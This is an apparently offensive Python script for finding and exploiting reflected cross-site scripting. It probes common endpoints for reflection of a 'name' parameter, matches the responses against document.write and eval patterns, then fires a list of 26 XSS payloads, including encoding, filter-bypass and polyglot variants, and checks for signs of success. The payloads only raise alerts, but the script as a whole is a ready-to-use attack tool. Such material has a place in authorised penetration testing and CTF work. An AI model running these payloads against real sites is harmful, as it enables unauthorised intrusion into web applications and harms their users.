import requests
import urllib.parse
import re
import time

print("="*80)
print("XSS DOCUMENT.WRITE() DISCOVERY & TESTING")
print("="*80)

# Common endpoints that frequently use document.write() with name parameter
common_endpoints = [
    "/",
    "/index.html",
    "/index.php",
    "/search",
    "/user",
    "/profile",
    "/welcome",
    "/hello",
    "/greet",
    "/page",
    "/home"
]

# Test for parameter reflection first
test_value = "deadend7x7probe"
base_url = "http://localhost"  # Will be updated based on actual target

print(f"\n[+] Testing {len(common_endpoints)} common endpoints for 'name' parameter reflection")
print(f"[+] Test value: {test_value}")
print(f"[+] Looking for document.write() usage patterns...")

document_write_patterns = [
    r'document\.write\s*\(\s*["\'][^"\']*deadend7x7probe',
    r'document\.write\s*\(\s*[^)]+deadend7x7probe',
    r'innerHTML\s*\+=\s*["\'][^"\']*deadend7x7probe',
    r'eval\s*\([^)]+deadend7x7probe',
    r'setTimeout\s*\([^,]+deadend7x7probe'
]

reflected_endpoints = []

for endpoint in common_endpoints:
    try:
        url = f"{base_url}{endpoint}"
        # Test GET method
        response = requests.get(url, params={'name': test_value}, timeout=5)
        
        # Check if parameter is reflected
        if test_value in response.text:
            print(f"\n[+] FOUND REFLECTION: {endpoint}")
            print(f"    Status: {response.status_code} | Length: {len(response.content)}B")
            
            # Check for document.write() patterns
            for pattern in document_write_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    print(f"    [!] POTENTIAL document.write() USAGE DETECTED!")
                    print(f"    Pattern: {pattern}")
                    reflected_endpoints.append({
                        'endpoint': endpoint,
                        'method': 'GET',
                        'pattern_found': pattern
                    })
            
            # Show context of reflection
            context = re.findall(r'.{0,50}deadend7x7probe.{0,50}', response.text)
            if context:
                print(f"    Context: {context[0][:100]}...")
        
        # Test POST method as well
        response_post = requests.post(url, data={'name': test_value}, timeout=5)
        if test_value in response_post.text and response_post.text != response.text:
            print(f"\n[+] FOUND REFLECTION (POST): {endpoint}")
            print(f"    Status: {response_post.status_code} | Length: {len(response_post.content)}B")
            
            for pattern in document_write_patterns:
                if re.search(pattern, response_post.text, re.IGNORECASE):
                    print(f"    [!] POTENTIAL document.write() USAGE DETECTED (POST)!")
                    reflected_endpoints.append({
                        'endpoint': endpoint,
                        'method': 'POST',
                        'pattern_found': pattern
                    })
                    
    except requests.exceptions.RequestException as e:
        print(f"[-] Error testing {endpoint}: {str(e)[:50]}...")
        continue

print(f"\n" + "="*80)
print(f"DISCOVERY SUMMARY")
print("="*80)
print(f"[+] Endpoints with parameter reflection: {len(reflected_endpoints)}")

if reflected_endpoints:
    print(f"\n[+] Targets for XSS testing:")
    for target in reflected_endpoints:
        print(f"    - {target['endpoint']} ({target['method']})")
else:
    print(f"\n[-] No endpoints with document.write() pattern found")
    print(f"[+] Testing all reflected endpoints for XSS anyway...")

# XSS Payloads to test
xss_payloads = {
    'basic_script': '<script>alert(document.domain)</script>',
    'basic_img': '<img src=x onerror=alert(document.domain)>',
    'basic_svg': '<svg onload=alert(document.domain)>',
    'mixed_case': '<ScRiPt>alert(document.domain)</ScRiPt>',
    'url_encoded': '%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
    'html_entities': '&#60;script&#62;alert(document.domain)&#60;&#47;script&#62;',
    'tag_blacklist': '<scr<script>ipt>alert(document.domain)</scr</script>ipt>',
    'space_alt': '<img/src=x/onerror=alert(document.domain)>',
    'details_toggle': '<details open ontoggle=alert(document.domain)>',
    'autofocus': '<input autofocus onfocus=alert(document.domain)>',
    'video_error': '<video><source onerror=alert(document.domain)>',
    'no_parenthesis': '<img src=x onerror=alert;throw 1337>',
    'unicode_encode': '<script>\\u0061\\u006c\\u0065\\u0072\\u0074(document.domain)</script>',
    'atob_eval': '<script>eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))</script>',
    'fromcharcode': '<script>Function(String.fromCharCode(97,108,101,114,116,40,49,41))()</script>',
    'template': '<img src=x onerror=alert`document.domain`>',
    'body_event': '<body onload=alert(document.domain)>',
    'iframe_srcdoc': '<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>',
    'object_data': '<object data="data:text/html,<script>alert(document.domain)</script>"></object>',
    'embed_src': '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+">',
    'mathml': '<math><mi xlink:href="data:x,<script>alert(document.domain)</script>"></mi></math>',
    'form_action': '<form action="javascript:alert(document.domain)"><input type=submit>',
    'button_formaction': '<button formaction=javascript:alert(document.domain)>Click</button>',
    'noscript_break': '<noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">',
    'polyglot': '\">\\'><script>alert(document.domain)</script>',
    'style_expression': '<div style="x:expression(alert(document.domain))">'
}

print(f"\n[+] Prepared XSS payloads: {len(xss_payloads)}")
print(f"[+] Testing categories: basic, encoding, filter_bypass, event_handlers, advanced")

# If we found targets, test them
if reflected_endpoints:
    print(f"\n" + "="*80)
    print(f"XSS TESTING - EXECUTING PAYLOADS")
    print("="*80)
    
    test_results = []
    
    for target in reflected_endpoints[:1]:  # Test first target only to avoid flooding
        endpoint = target['endpoint']
        method = target['method']
        url = f"{base_url}{endpoint}"
        
        print(f"\n[+] Testing endpoint: {endpoint} ({method})")
        print(f"[+] URL: {url}")
        
        for payload_name, payload in list(xss_payloads.items())[:15]:  # Test subset first
            try:
                if method == 'GET':
                    response = requests.get(url, params={'name': payload}, timeout=5)
                else:
                    response = requests.post(url, data={'name': payload}, timeout=5)
                
                # Check for XSS indicators
                indicators = {
                    'script_tag': '<script>' in response.text and '<script>' not in ['&lt;', '&#60;'],
                    'event_handler': re.search(r'on\w+\s*=\s*[\'"]?alert', response.text, re.I),
                    'javascript_proto': re.search(r'javascript:alert', response.text, re.I),
                    'data_uri': re.search(r'data:text/html.*alert', response.text, re.I),
                    'svg_onload': re.search(r'<svg[^>]*onload', response.text, re.I),
                    'payload_reflected': payload in response.text
                }
                
                print(f"\n    [TEST] {payload_name}")
                print(f"         Status: {response.status_code} | Length: {len(response.content)}B")
                print(f"         Reflected: {indicators['payload_reflected']}")
                
                if any(indicators.values()):
                    print(f"         [!] POTENTIAL XSS INDICATORS:")
                    for key, value in indicators.items():
                        if value:
                            print(f"             - {key}: {value}")
                
                test_results.append({
                    'endpoint': endpoint,
                    'payload_name': payload_name,
                    'status': response.status_code,
                    'reflected': indicators['payload_reflected'],
                    'indicators': sum(1 for v in indicators.values() if v)
                })
                
                # Small delay to avoid rate limiting
                time.sleep(0.1)
                
            except Exception as e:
                print(f"[-] Error testing {payload_name}: {str(e)[:50]}")
                continue
    
    # Summary of results
    print(f"\n" + "="*80)
    print(f"XSS TEST RESULTS SUMMARY")
    print("="*80)
    
    vulnerable_tests = [r for r in test_results if r['indicators'] > 0]
    reflected_tests = [r for r in test_results if r['reflected']]
    
    print(f"[+] Tests completed: {len(test_results)}")
    print(f"[+] Reflected payloads: {len(reflected_tests)}")
    print(f"[+] Tests with XSS indicators: {len(vulnerable_tests)}")
    
    if vulnerable_tests:
        print(f"\n[!] POTENTIAL XSS VULNERABILITIES FOUND:")
        for result in vulnerable_tests[:5]:  # Show top 5
            print(f"    - Endpoint: {result['endpoint']}")
            print(f"      Payload: {result['payload_name']}")
            print(f"      Indicators: {result['indicators']}")
    else:
        print(f"\n[-] No obvious XSS indicators found")
        print(f"[+] Try more encoding variations and WAF bypass techniques")

else:
    print(f"\n[-] No reflected endpoints found - cannot test XSS")
    print(f"[+] Possible reasons:")
    print(f"    - Target URL is incorrect")
    print(f"    - Parameter name is not 'name'")
    print(f"    - Endpoint requires authentication")
    print(f"    - Application uses different technology")

print(f"\n[+] Testing complete. Check results above for XSS confirmation.")
